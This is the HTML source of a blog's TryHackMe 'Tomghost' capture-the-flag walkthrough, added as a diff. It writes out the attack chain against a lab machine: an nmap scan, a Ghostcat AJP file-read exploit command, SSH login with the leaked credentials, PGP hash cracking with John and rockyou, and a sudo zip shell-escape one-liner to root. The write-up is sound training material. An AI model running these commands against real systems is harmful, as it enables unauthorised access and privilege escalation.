@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script>
+  <title>
+  Tom Ghost: TryHackMe Writeup · CCrashZer0
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CCrashZer0">
+<meta name="description" content="Try Hack Me - Tomghost Link to heading Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.
+Disclaimer - Your IP address will be different! Link to heading Scanning and Enumeration Link to heading We will start with running our nmap scan.
+Command: nmap -A -T4 -sC -sV -oN nmap/initial.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tom Ghost: TryHackMe Writeup">
+  <meta name="twitter:description" content="Try Hack Me - Tomghost Link to heading Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.
+Disclaimer - Your IP address will be different! Link to heading Scanning and Enumeration Link to heading We will start with running our nmap scan.
+Command: nmap -A -T4 -sC -sV -oN nmap/initial.">
+
+<meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/tomghost/">
+  <meta property="og:site_name" content="CCrashZer0">
+  <meta property="og:title" content="Tom Ghost: TryHackMe Writeup">
+  <meta property="og:description" content="Try Hack Me - Tomghost Link to heading Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.
+Disclaimer - Your IP address will be different! Link to heading Scanning and Enumeration Link to heading We will start with running our nmap scan.
+Command: nmap -A -T4 -sC -sV -oN nmap/initial.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="tutorials">
+    <meta property="article:published_time" content="2020-07-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-07-05T00:00:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/tomghost/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/">
+      CCrashZer0
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/tutorials/">Tutorials</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/tomghost/">
+          Tom Ghost: TryHackMe Writeup
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="try-hack-me---tomghost">
+  Try Hack Me - Tomghost
+  <a class="heading-link" href="#try-hack-me---tomghost">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This is a TryHackMe box. To access this you must sign up to <a href="https://tryhackme.com/"  class="external-link" target="_blank" rel="noopener">https://tryhackme.com/</a>.</p>
+<h2 id="disclaimer----your-ip-address-will-be-different">
+  Disclaimer -  Your IP address will be different!
+  <a class="heading-link" href="#disclaimer----your-ip-address-will-be-different">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<hr>
+<h2 id="scanning-and-enumeration">
+  Scanning and Enumeration
+  <a class="heading-link" href="#scanning-and-enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We will start with running our nmap scan.<br>
+Command: <code>nmap -A -T4 -sC -sV -oN nmap/initial.txt 10.10.93.77</code></p>
+<p>Command Breakdown:</p>
+<pre><code>-A: do an extensive scan on these ports
+
+-T4: speed of nmap scan is 4/5 (personal preference of mine)
+
+-sC: Scan with default NSE scripts. Considered useful for discovery and safe
+
+-sV: Attempts to determine the version of the service running on port
+
+-oN: Normal output to the file normal.file
+</code></pre>
+<p>Once the results came back there was only one thing that appeared out of place to me and that was port 8009.</p>
+<p>By default, Apache Tomcat listens on 3 ports, 8005, 8009 and 8080. A common misconfiguration is blocking port 8080 but leaving ports 8005 or 8009 open for public access.</p>
+<figure><img src="/images/TomGhost/nmapResulst.png">
+</figure>
+
+<p>We will bu using the following tool to exploit this vulnerability.<br>
+<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487"  class="external-link" target="_blank" rel="noopener">00theway/Ghostcat-CNVD-2020-10487</a></p>
+<p>Command: <code>python3 ajpShooter.py http://10.10.93.77:8080 8009 /WEB-INF/web.xml read</code></p>
+<figure><img src="/images/TomGhost/ajpShooter.png">
+</figure>
+
+<p>It would seems that we where able to find what seems to be both a user name and a password.</p>
+<p>Let&rsquo;s look back at our nmap scan. Remeber that port 22 was open. We might be able to use these credentials to log into our box.</p>
+<p>Command: <code>ssh &lt;username&gt;@10.10.93.77</code><br>
+Enter in the password when you are prompted to and BLAM! we are connected under that user account.</p>
+<p><figure><img src="/images/TomGhost/sfUser.png">
+</figure>
+
+When we use the <code>ls</code> command we see that there are two files. Both of these files could be encryptions keys, but for right now we are going to look into the <code>/home</code> directory to see if we can find anything useful.</p>
+<p><figure><img src="/images/TomGhost/merlin.png">
+</figure>
+
+Let&rsquo;s keep digging and see if we an find anything else. If we <code>ls /home/merlin</code> you will see that it is here we find our first flag <code>user.txt</code>.</p>
+<p><figure><img src="/images/TomGhost/userFlag.png">
+</figure>
+
+Now we are going to return to pgp and asc file that we found in the <code>skyfuck</code> directory.<br>
+We are going to all of these files to our host machine. In order to do this we will need to use the <code>scp</code> command.</p>
+<p>When using the <code>scp</code> command you will want to run it on your host maching and not from the Tomghost VM.<br>
+Command: <code>scp skyfuck@10.10.31.90:/home/skyfuck/* .</code></p>
+<h2 id="cracking-the-hash">
+  Cracking the Hash
+  <a class="heading-link" href="#cracking-the-hash">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<hr>
+<p>After running the <code>scp</code> command we now have both the credential.pgp and tryhackme.asc on our host maching.<br>
+The next thing we want to do is use John The Ripper to get the hash from the <code>tryhackme.asc</code>.<br>
+Here is a good <a href="https://www.youtube.com/watch?v=DBpd9e4tJfg"  class="external-link" target="_blank" rel="noopener">video</a> for recovering your PGP key with John.<br>
+Command: <code>gpg2john tryhackme.asc &gt; hash</code><br>
+Once complete you can see that we now have our password. Lets make sure that we take note of that.</p>
+<p>It is now time for to crack open the hash that we collected eariler. This can be down by using John and combining it with the rockyou.txt wordlist.</p>
+<p>FYI in order to find the location of your rockyou.txt word list just use <code>locate rockyou.txt</code>. Mind is located in the <code>/usr/share/wordlists/</code> directory.</p>
+<p>Command: <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code>
+<figure><img src="/images/TomGhost/passwd.png">
+</figure>
+</p>
+<p>It seems that John was able to find out passphrase. Now we are going to use that phrase to import adn decrypt our PGP key that we have.</p>
+<pre tabindex="0"><code>gpg --import tryhackme.asc
+gpg --decrypt credential.pgp
+</code></pre><p><figure><img src="/images/TomGhost/merlinPasswd.png">
+</figure>
+
+Things are starting to work in our favor.
+We now have the password to the Merlin account.<br>
+So we need to go back to our SSH shell and change from the skyfuck user to merlin, that can be done by using the <code>SU</code> command.</p>
+<p>Command: <code>su merlin</code><br>
+Once you are logged in as Merlin lets see if we have the abiliy to run anything as sudo.<br>
+<code>sudo -l</code><br>
+It seems that the only thing we can use sudo on is <code>/usr/bin/zip</code><br>
+Afer a little bit of reasearch I found this <a href="https://d00mfist1.gitbooks.io/ctf/privilege_escalation_-_linux.html"  class="external-link" target="_blank" rel="noopener">GitBook</a> on privilege escalation. Under the zip portion there was this oneliner that would allow us to gain access to a root shell.
+<code>sudo zip -q /tmp/test.zip cc0.txt -T -TT '/bin/sh #'</code></p>
+<p><figure><img src="/images/TomGhost/shell.png">
+</figure>
+
+Once we have the shell we can us the <code>id</code> command to see that we are now running as a root user.</p>
+<p>Now it is time to find the root.txt file.</p>
+<pre tabindex="0"><code>ls /root
+cat /root/root.txt
+</code></pre><figure><img src="/images/TomGhost/rootFlag.png">
+</figure>
+
+<h1 id="congratulations-you-have-just-completed-the-tomghost-challenge">
+  Congratulations you have just completed the Tomghost challenge!
+  <a class="heading-link" href="#congratulations-you-have-just-completed-the-tomghost-challenge">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CCrashZer0 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/CCrashZer0/ccrashzer0.github.io/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
